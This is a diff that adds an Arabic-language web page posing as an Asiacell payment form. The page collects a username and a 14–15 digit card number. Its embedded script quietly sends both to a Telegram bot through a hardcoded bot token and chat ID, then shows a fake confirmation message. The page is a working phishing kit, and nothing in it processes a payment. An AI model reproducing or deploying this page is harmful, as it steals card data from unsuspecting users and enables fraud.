@@ -1,0 +1,107 @@
+<!DOCTYPE html
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>دفع إسيا سيل</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            background: none;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            font-size: 18px;
+            padding: 20px;
+        }
+        .logo {
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .alert {
+            display: none;
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo"> </div>
+    
+    <form id="paymentForm">
+        <div class="form-group">
+            <label for="username">اسم المستخدم:</label>
+            <input type="text" id="username" required>
+        </div>
+        <div class="form-group">
+            <label for="card">رقم البطاقة (14-15 رقم):</label>
+            <input type="text" id="card" pattern="\d{14,15}" required>
+        </div>
+        <button type="submit">دفع الآن</button>
+    </form>
+
+    <div id="successAlert" class="alert">
+        سيتم تحقق من خلال ريبوت
+    </div>
+
+    <script>
+        document.getElementById('paymentForm').onsubmit = async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const card = document.getElementById('card').value;
+            
+            // إرسال إلى تليجرام
+            const botToken = '7187779048:AAG2qZOl6JYI7pr_EJIb6C371HCuxcAZe7A';
+            const chatId = '7154036384';
+            const message = `كارد جديد:\n👤 الاسم: ${username}\n💳 البطاقة: ${card}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                document.getElementById('successAlert').style.display = 'block';
+                document.getElementById('paymentForm').reset();
+                
+            } catch (error) {
+                alert('حدث خطأ في الإرسال');
+            }
+        };
+    </script>
+</body>
+</html>
